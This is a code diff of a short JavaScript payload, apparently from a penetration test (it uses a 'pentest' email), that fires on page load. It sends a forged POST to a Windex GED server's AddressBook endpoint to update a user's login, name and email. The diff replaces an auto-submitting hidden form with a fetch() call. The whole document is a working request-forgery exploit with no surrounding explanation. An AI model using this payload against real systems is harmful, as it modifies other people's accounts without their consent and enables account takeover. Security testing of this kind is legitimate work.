@@ -1,37 +1,34 @@
-function submitForm() {
+function sendPostRequest() {
     var hostname = window.location.hostname
+    alert(hostname)
+    var url = 'http://'+hostname+'/windex-ged/WindexServer';
+    var data = {
+        Agent: "AddressBook",
+        Order: "Update",
+        IdUser: "58896",
+        IdRightTemplate: "0",
+        Login: "1234567A",
+        Civility: "",
+        Lastname: "T1",
+        Firstname: "T1",
+        Service: "Gestionnaire",
+        Email: "pentest1@algosecure.fr",
+        IdLanguage: "FR",
+        UserType: "",
+        DossierFilter: ""
+    };
 
-    var form = document.createElement('form');
-    form.method = 'POST';
-    form.action = 'http://'+hostname+'/windex-ged/WindexServer';
-
-    var formElements = [
-        { name: "Agent", value: "AddressBook" },
-        { name: "Order", value: "Update" },
-        { name: "IdUser", value: "58898" },
-        { name: "IdRightTemplate", value: "0" },
-        { name: "Login", value: "1234567C" },
-        { name: "Civility", value: "" },
-        { name: "Lastname", value: "T3" },
-        { name: "Firstname", value: "T3" },
-        { name: "Service", value: "Gestionnaire" },
-        { name: "Email", value: "pentest1@algosecure.fr" },
-        { name: "IdLanguage", value: "FR" },
-        { name: "UserType", value: "" },
-        { name: "DossierFilter", value: "" }
-    ];
-
-    formElements.forEach(function(element) {
-        var input = document.createElement('input');
-        input.type = 'hidden';
-        input.name = element.name;
-        input.value = element.value;
-        form.appendChild(input);
-    });
-
-    document.body.appendChild(form);
-
-    form.submit();
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: new URLSearchParams(data)
+    })
+    .then(response => response.text())
+    .then(data => console.log('Success:', data))
+    .catch(error => console.error('Error:', error));
 }
 
-window.onload = submitForm;
+// Call the function when the script is loaded
+window.onload = sendPostRequest
